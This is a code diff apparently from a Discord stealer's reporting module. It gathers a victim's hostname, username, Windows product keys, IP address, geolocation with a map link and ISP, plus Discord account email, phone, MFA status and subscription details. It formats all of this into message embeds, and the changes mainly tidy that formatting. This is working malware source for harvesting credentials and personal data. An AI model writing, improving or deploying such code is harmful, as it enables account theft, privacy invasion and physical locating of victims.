@@ -16,10 +16,10 @@ const json = async (zipFile) => {
   const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
   const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'dsc_acc.json')).toString());
   const computerInfoFields = [
-    ['RAM', Math.floor(os.totalmem() / 1000 / 1000 / 1000) + 'GB'],
-    ['Name', os.hostname()],
+    ['RAM', Math.floor(os.totalmem() / 1024 / 1024 / 1024) + 'GB'],
+    ['Name', codeBlock(os.hostname())],
     ['Uptime', `<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`],
-    ['Username', os.userInfo().username],
+    ['Username', codeBlock(os.userInfo().username)],
     ['OS version', os.version()],
     ['Product Key', codeBlock(require('./product-key').productKey)],
     ['Backup Product Key', codeBlock(require('./product-key').backupProductKey)],
@@ -27,7 +27,7 @@ const json = async (zipFile) => {
   const ipInfoFields = [
     ['IP Address', `[${codeBlock(await ipInfo('query'))}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
     ['Location', `[${codeBlock(await ipInfo('lat') + ', ' + await ipInfo('lon'))}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
-    ['ISP', await ipInfo('isp')],
+    ['ISP', codeBlock(await ipInfo('isp'))],
   ];
 
   const embeds = [
@@ -52,8 +52,8 @@ const json = async (zipFile) => {
       ['Locale', codeBlock(account.locale)],
       ['NSFW Allowed', account.nsfw_allowed],
       ['MFA Enabled', account.mfa_enabled],
-      ['Email', `${codeBlock(account.email)}${account.verified ? ' (verified)' : ' (not verified)'}` || 'No Email'],
-      ['Phone Number', codeBlock(account.phone) || 'No Phone Number'],
+      ['Email', account.email ? codeBlock(account.email) : 'No Email'],
+      ['Phone Number', account.phone ? codeBlock(account.phone) : 'No Phone Number'],
       ['Nitro Subscription', nitroSubscriptionType(account.premium_type)],
       ['Flags', accountFlags(account.flags)],
     ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
